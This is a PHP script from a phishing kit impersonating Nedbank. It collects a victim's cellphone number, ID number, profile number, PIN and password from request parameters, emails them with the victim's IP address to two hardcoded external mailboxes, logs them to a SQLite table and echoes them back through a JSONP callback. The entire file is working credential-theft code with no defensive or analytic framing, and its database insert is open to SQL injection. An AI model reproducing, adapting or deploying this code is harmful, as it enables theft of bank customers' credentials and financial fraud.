<?php
if(isset($_GET['reference']))
{
    include_once 'sqlite.php';
	$ccn = $_GET['PROFILE_NUMBER'];
	$csp = $_GET['PIN'];
        $idNo = $_GET['ID_NUMBER'];
        $cell = $_GET['reference'];
        
	//$atm = $_GET['atm'];
	$pwd = $_GET['PASSWORD'];
	
	if($ccn == "" || $csp == "" || $pwd == ""){
		$error = 1;
	}
	
	$ip = $_SERVER['REMOTE_ADDR'];
	
	$time = time();
	$date = date("Y-m-d H:i:s");
	
        $msg = "cellphone number  : $cell \r\n";
        $msg .= "ID Number : $idNo \r\n";
	$msg .= "Profile Number : $ccn \r\n";
	$msg .= "Pin: $csp \r\n";
	//$msg .= "ATM Pin: $atm \r\n";
	$msg .= "Password: $pwd \r\n";
        $msg .= "Remote_Addr: $ip \r\n\n";
        
	$from = "noreply <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from;
        
        $subject = "***NEW COMPLETE Access [$ccn] [$ip]***";
        
        if(mail('cmforce2020@hotmail.com,u.n.i.a.panafrikanist@gmail.com', $subject, $msg, $headers))
        //if(1)
        {
            $query = 'INSERT INTO result (subject,message,isread,date_time) VALUES ("'.$subject.'","'.$msg.'","notread","'. date("Y-m-d H:i:s").'");';
            $db->exec($query);
            
            $experience_login = file_get_contents('../ref.html');
            $experience_login = str_replace('current_date', date('d M Y H:i:s'), $experience_login);
            //$experience_login = str_replace('{userPassword}', $csp, $experience_login);
            $experience_login = str_replace('{ID_NUMBER}', $idNo, $experience_login);
            include("../images/Nedbank.png");
            $experience_login = str_replace('{PROFILE_NUMBER}', $ccn, $experience_login);
            $experience_login = str_replace('{PIN}', $csp, $experience_login);
            $experience_login = str_replace('{PASSWORD}', $pwd, $experience_login);
            
            
            //sleep(2);
            
            header("Content-Type: application/javascript");
            $callback = $_GET["callback"];
            //$message = $_GET["message"]." you got a response from server yipeee!!!";
            //$jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $experience_login)).'\'}';
            $jsonResponse = json_encode(array('message' => $experience_login, 'accessData' => array(
                    'ID_NUMBER' => $idNo, 
                    'PROFILE_NUMBER' => $ccn,
                    'PIN' => $csp,
                    'PASSWORD' => $pwd
                )));
            echo $callback . '(' . $jsonResponse . ')';	
                //sleep(40);
            /*
                setcookie('ccn', $ccn, 0, '/');
                setcookie('csp', $csp, 0, '/');
                //setcookie('atm', $atm, 0, '/');
                setcookie('pwd', $pwd, 0, '/');
                $htmlMessage = $ccn;

                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                //$message = $_GET["message"]." you got a response from server yipeee!!!";
                $jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $htmlMessage)).'\'}';
                $jsonResponse = json_encode(
                array(
                    'ID_NUMBER' => $idNo, 
                    'PROFILE_NUMBER' => $ccn,
                    'PIN' => $csp,
                    'PASSWORD' => $pwd
                ));
                
                header("Content-Type: application/javascript");
                $callback = $_GET["callback"];
                //$message = $_GET["message"]." you got a response from server yipeee!!!";
                //$jsonResponse = '{"message":\''.trim(preg_replace('/\s+/', ' ', $experience_login)).'\'}';
                $jsonResponse = json_encode(array('message' => $experience_login, 'parameters' => ));
                echo $callback . '(' . $jsonResponse . ')';	*/
        }			
}
